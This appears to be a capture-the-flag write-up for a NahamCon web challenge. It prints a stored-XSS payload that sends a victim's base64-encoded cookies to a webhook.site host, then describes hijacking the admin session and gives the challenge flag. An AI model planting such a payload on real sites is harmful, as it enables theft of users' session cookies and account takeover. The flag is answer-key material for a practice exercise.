# Star Wars
> If you love Star Wars as much as I do you need to check out this blog!

## About the Challenge
We got another website to pentest, and there are some functionality that we can test such as register, login, giving a comment in post.


[Image extracted text: X-Wing
Logout]


[Image extracted text: chucked in as light relief but the serious and dark stories that grow throughout the
seasons are phenomenally strong and superb quality. This stands
easily alongside the best movies as great Star Wars. The writing and voice acting are terrific while the action and animation is amazing:
Comments
Ahsoka is the best character in the entire Star Wars sagal
congon-tor
Comment
Send]


## How to Solve?
When I attempt to post a comment, my comment is reviewed by the admin first. So, I assume that this website is vulnerable to XSS, and we need to steal the admin's cookie. To steal the admin cookie, im using this simple XSS payload

```
<script>var i=new Image(); i.src="https://webhook.site/47c2cdc9-1233-4ac8-8e8b-55efe06aeb2c/?cookie="+btoa(document.cookie);</script>
```


[Image extracted text: Comments
Ahsoka is the best character in the entire Star Wars sagal
congon4tor
This comment is not public it needs to be reviewed
tesssss
Comment
Send]


Submit the payload and then wait until you got a pingback. And voilà, you got an admin cookie


[Image extracted text: Request Details
Permalink
Raw content
Expont as-
GET
https IIwebhook site/47c2cdc9-1233-4ac8-8e8b-55efeO6aeb2c/?cookie-eC13aWSnPW5
SmZjR1ZSYIdGdVpXNTBJanAwY2SWbExDSnBaQOkZTVgwLIpJMUZBUSSQOGxOSOgM
RFpZLUUta2JseXMxT1FrLVBGODQ =
Host
34.29.109.106 whois
Date
06/17/2023 12.30.43 PM (a few seconds ago)
Size
bytes
c25cbfe9-32de-4537-b047-c4a94553a149
Files
Query strings
cookie
eC13aNSnPNVSSmZjRIZSYldGdVpXNTBJanAwYZSWbExDSnBaqakZTVgwLlpJMUZBUSSQOGX
0S09MRFp2LUUta2]seXMxTIFrLVBGODQ=
No content]


Decode the cookie using `base64` and then replace your cookie with the admin cookie. After that, go to `/admin` endpoint to obtain the flag


[Image extracted text: Not secure
challenge nahamcon com 31451/admin
6
A
X-Wing
Admin
Logout
Congratulations you are the admin here is your flag: flag{a538c88890d45a382e44dfd00296a99b}]


```
flag{a538c88890d45a382e44dfd00296a99b}
```